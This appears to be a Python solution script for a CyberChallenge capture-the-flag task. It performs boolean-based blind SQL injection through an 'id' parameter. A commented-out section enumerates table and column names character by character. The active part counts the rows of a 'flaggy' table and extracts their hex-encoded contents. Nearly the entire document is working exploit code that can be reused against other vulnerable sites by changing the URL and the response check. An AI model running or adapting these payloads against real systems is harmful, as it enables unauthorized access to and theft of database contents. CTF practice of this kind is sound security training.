import requests
import time
import string


sess = requests.Session()
url = ('http://filtered.challs.cyberchallenge.it/post.php')

"""
num_tables = 1
while True:
    payload = f"1' && (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE()) = {num_tables} #"
    response = sess.get(url, params = {'id': payload})
    
    if b'Article not found!' not in response.content:
        print(f"Matched!\t Number of Tables: {num_tables}")
        break

    num_tables += 1


tables = {}
table_name = ''
for i in range(num_tables):
    while True:
        for c in string.ascii_letters:
            payload = f"1' && (SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT {i}, 1) LIKE '{table_name + c}%' #"
            response = sess.get(url, params = {'id': payload})
            
            if b'Article not found!' not in response.content:
                table_name += c
                print(f"Matched!\t Table name: {table_name}", end = '\r')
                break
        else:
            print(f"Matched!\t Table name: {table_name}")
            tables[table_name] = []
            table_name = ''
            break


for t in tables:
    num_cols = 0

    while True:
        payload = f"1' && (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() && table_name = '{t}') = {num_cols} #"
        response = sess.get(url, params = {'id': payload})
            
        if b'Article not found!' not in response.content:
            break

        num_cols += 1
        
    print(f'\nTable: {t}')
    
    col_name = ''
    for i in range(num_cols):
        while True:
            for c in string.ascii_letters:
                payload = f"1' && (SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() && table_name = '{t}' LIMIT {i}, 1) LIKE '{col_name + c}%' #"
                response = sess.get(url, params = {'id': payload})
                
                if b'Article not found!' not in response.content:
                    col_name += c
                    print(f"\t --: {col_name}", end = '\r')
                    break
                
            else:
                print(f"\t --: {col_name}")
                tables[t].append(col_name)
                col_name = ''
                break
"""
tables = {'flaggy': ['now', 'play']}


##### MIRATO A FLAGGY #####
print('\n')

num_rows = 0
while True:
    payload = f"1' && (SELECT COUNT(*) FROM flaggy) = {num_rows} #"
    response = sess.get(url, params = {'id': payload})
        
    if b'Article not found!' not in response.content:
        print(f'Flaggy number of rows: {num_rows}')
        break

    num_rows += 1

entry = ''
for i in range(num_rows):
    print('\n')
    print(f'\tRow #{i}')

    for col in tables['flaggy']:
        while True:
            for c in '0123456789abcdef':        # Per velocizzare il processo
                payload = f"1' && (SELECT HEX({col}) FROM flaggy LIMIT {i}, 1) LIKE '{entry + c}%' #"
                response = sess.get(url, params = {'id': payload})
                
                if b'Article not found!' not in response.content:
                    entry += c
                    print(f"\t{entry}", end = '\r')
                    break
            else:
                print(f"\t{entry}")
                entry = ''
                # Maybe save everything in a file
                break
